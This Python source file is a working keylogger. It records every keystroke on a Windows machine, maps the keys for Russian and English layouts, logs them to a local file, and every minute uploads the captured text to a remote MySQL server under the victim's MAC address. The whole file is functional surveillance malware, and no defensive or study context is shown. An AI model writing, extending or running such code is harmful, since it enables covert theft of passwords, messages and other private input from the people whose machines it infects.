import time
import uuid
import ctypes
import threading
import pymysql
from pymysql import Error
from config import host, user, password, db_name
import logging
from pynput import keyboard
from layout_mapping import eng_to_rus, rus_to_eng, language_codes


def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409']
    return language


def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += '\n'
    elif key == keyboard.Key.tab:
        text += '\t'
    elif key == keyboard.Key.space:
        text += ' '
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.alt_l:
        pass
    elif key == keyboard.Key.backspace:
        text = text[:-2]
    else:
        if detect_keyboard_layout_win() == 'Russian':
            try:
                text += eng_to_rus[str(key).strip("'")]
            except:
                text += str(key).strip("'")
        else:
            try:
                text += rus_to_eng[str(key).strip("'")]
            except:
                text += str(key).strip("'")


def listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def logger():
    global text
    
    while True:
        if len(text) > 20:
            logging.info(text)  # Записываем строку в лог-файл
            text = ''
            print("Строка записана в лог-файл")  # Для демонстрации в консоли
        time.sleep(15)



def db_updater():

    try:
        connection = pymysql.connect(
            host=host,
            port=3306,
            user=user,
            password=password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )
        print('Successfully connected to BD')
    except Error as e:
        print(f"Error while connecting to MySQL: {e}")
        return  # Возвращаем из функции, если соединение не удалось

    f = open('text_log.log', 'r+')
    mac_address = uuid.getnode()
    cursor = connection.cursor()

    while True:
        content = f.read()
        if not content:  
            # Если файл пустой, переходим в начало
            f.seek(0)
            content = f.read()

        if len(content) > 20:
            cursor.execute("SELECT * FROM users_data WHERE username = %s", (mac_address,))
            result = cursor.fetchone()

            if result:  # Если пользователь существует
                new_content = result['content'] + '\n' + content  # Объединяем старое значение с новым
                cursor.execute("UPDATE users_data SET content = %s WHERE username = %s", (new_content, mac_address))
                connection.commit()  # Сохраняем изменения в базе данных
                f.truncate(0)  # Очищаем файл
                f.seek(0)  # Возвращаем курсор в начало
                print(f'Updated user {mac_address} with new content.')
            else:  # Если пользователя нет
                print('User does not exist, adding new user...')
                cursor.execute("INSERT INTO users_data (username, content) VALUES (%s, %s)", (mac_address, content))
                connection.commit()  # Сохраняем изменения в базе данных
                f.truncate(0)  # Очищаем файл
                f.seek(0)  # Возвращаем курсор в начало
                print('Data added')

        time.sleep(60)

logging.basicConfig(filename='text_log.log', level=logging.INFO)
text = ''

if __name__ == '__main__':
    thread1 = threading.Thread(target=logger)
    thread2= threading.Thread(target=listener)
    thread3 = threading.Thread(target=db_updater)
    thread1.start()
    thread2.start()
    thread3.start()
